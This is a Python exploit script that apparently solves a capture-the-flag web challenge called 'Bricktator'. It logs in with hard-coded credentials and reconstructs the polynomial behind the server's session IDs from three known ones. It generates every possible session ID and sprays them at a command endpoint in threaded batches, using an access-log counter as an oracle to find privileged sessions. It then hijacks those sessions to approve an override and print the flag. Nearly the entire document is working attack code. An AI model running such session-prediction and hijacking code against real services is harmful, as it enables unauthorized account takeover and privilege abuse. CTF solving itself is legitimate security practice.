#!/usr/bin/env python3
"""Bricktator v2 — simpler sequential scan, no binary search"""
import requests, sys, base64, time, re, concurrent.futures

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://bricktator.web.ctf.umasscybersec.org:8080"
BASE = BASE.rstrip('/')
PRIME = 2_147_483_647

def encode_sid(sid): return base64.urlsafe_b64encode(sid.encode()).decode().rstrip('=')
def parse_sid(sid):
    p = sid.split('-'); return int(p[0]), int(p[1], 16)
def make_sid(x, y): return f"{x:05d}-{y:08x}"

def reconstruct_poly(pts, P):
    (x0,y0),(x1,y1),(x2,y2) = pts
    m = [[1,x0,pow(x0,2,P),y0],[1,x1,pow(x1,2,P),y1],[1,x2,pow(x2,2,P),y2]]
    for c in range(3):
        inv = pow(m[c][c], P-2, P)
        for j in range(4): m[c][j] = m[c][j]*inv%P
        for r in range(3):
            if r!=c:
                f=m[r][c]
                for j in range(4): m[r][j]=(m[r][j]-f*m[c][j])%P
    return [m[i][3] for i in range(3)]

def eval_poly(c, x, P):
    y=0
    for i in range(len(c)-1,-1,-1): y=(y*x+c[i])%P
    return y

def get_log_count(sess):
    for _ in range(3):
        try:
            r = sess.get(f"{BASE}/actuator/accesslog", timeout=15)
            if r.status_code == 200: return r.json().get("count", 0)
        except: pass
        time.sleep(0.5)
    return -1

# Login
print("[1] Login...", flush=True)
s = requests.Session()
s.post(f"{BASE}/login", data={"username": "bricktator", "password": "goldeagle"}, allow_redirects=True)
sc = s.cookies.get("SESSION")
padded = sc + '=' * (4 - len(sc) % 4) if len(sc) % 4 else sc
bk_sid = base64.urlsafe_b64decode(padded).decode()
print(f"    Session: {bk_sid}", flush=True)

# Get known sessions
print("[2] Known sessions...", flush=True)
john_sid = s.get(f"{BASE}/actuator/sessions?username=john_doe").json()["sessions"][0]["id"]
jane_sid = s.get(f"{BASE}/actuator/sessions?username=jane_doe").json()["sessions"][0]["id"]
print(f"    john={john_sid}, jane={jane_sid}", flush=True)

# Reconstruct
print("[3] Polynomial...", flush=True)
coeffs = reconstruct_poly([parse_sid(bk_sid), parse_sid(john_sid), parse_sid(jane_sid)], PRIME)
print(f"    coeffs={coeffs}", flush=True)

# Generate all session IDs
all_sids = [make_sid(x, eval_poly(coeffs, x, PRIME)) for x in range(1, 5002)]

# Scan: fire batches of 50 to /command, then check log count
# Simpler approach: just test batches, if count goes up, test individually within batch
print("[4] Scanning for YANKEE_WHITE...", flush=True)
s.get(f"{BASE}/command")  # baseline access
time.sleep(1)
baseline = get_log_count(s)
print(f"    Baseline log count: {baseline}", flush=True)

yankee = [bk_sid]
candidates = [sid for sid in all_sids if sid != bk_sid]

BATCH = 100
log_count = baseline

for batch_idx in range(0, len(candidates), BATCH):
    if len(yankee) >= 5:
        break
    batch = candidates[batch_idx:batch_idx+BATCH]

    # Fire all requests in batch
    def hit(sid):
        try:
            requests.get(f"{BASE}/command", cookies={"SESSION": encode_sid(sid)},
                        allow_redirects=False, timeout=10)
        except: pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        list(ex.map(hit, batch))

    # Wait for BCrypt to finish (strength 13 ≈ 1s per YW session)
    time.sleep(1.5)

    new_count = get_log_count(s)
    if new_count < 0:
        print(f"    Log error at batch {batch_idx}, retrying...", flush=True)
        time.sleep(2)
        new_count = get_log_count(s)
        if new_count < 0: continue

    hits = new_count - log_count
    if hits > 0:
        print(f"    Batch {batch_idx}: {hits} YANKEE_WHITE! Testing individually...", flush=True)
        # Test each session in the batch individually
        for sid in batch:
            if len(yankee) >= 5: break
            before = get_log_count(s)
            if before < 0: continue
            hit(sid)
            time.sleep(1.5)
            after = get_log_count(s)
            if after > before:
                yankee.append(sid)
                print(f"    ★ Found YW #{len(yankee)}: {sid}", flush=True)
        log_count = get_log_count(s)
    else:
        log_count = new_count

    if batch_idx % 500 == 0:
        print(f"    Progress: {batch_idx}/{len(candidates)}, found {len(yankee)} YW", flush=True)

print(f"\n[5] Found {len(yankee)} YANKEE_WHITE sessions:", flush=True)
for sid in yankee:
    print(f"    {sid}", flush=True)

if len(yankee) < 5:
    print("    Not enough! Exiting.", flush=True)
    sys.exit(1)

# Override
print("\n[6] Initiating override...", flush=True)
r = s.get(f"{BASE}/command")
r = s.post(f"{BASE}/command/override")
tok = re.search(r'/override/([a-f0-9]+)', r.text) or re.search(r'([a-f0-9]{32})', r.text)
if not tok:
    print(f"    No token! {r.text[:300]}", flush=True)
    sys.exit(1)
token = tok.group(1)
print(f"    Token: {token}", flush=True)

# Approve with 4 more YW sessions
for i, sid in enumerate(yankee[1:5], 2):
    print(f"[7] Approval #{i}: {sid}", flush=True)
    r = requests.post(f"{BASE}/override/{token}",
                      cookies={"SESSION": encode_sid(sid)},
                      allow_redirects=True, timeout=120)
    if "UMASS{" in r.text:
        flag = re.search(r'UMASS\{[^}]+\}', r.text)
        print(f"\n[+] FLAG: {flag.group(0) if flag else r.text}", flush=True)
        sys.exit(0)
    print(f"    → {r.text[:120]}", flush=True)

print("\n[8] Checking final status...", flush=True)
r = requests.get(f"{BASE}/override/{token}", cookies={"SESSION": encode_sid(yankee[0])})
if "UMASS{" in r.text:
    print(f"[+] FLAG: {re.search(r'UMASS{[^}]+}', r.text).group(0)}", flush=True)
else:
    print(f"    {r.text[:300]}", flush=True)
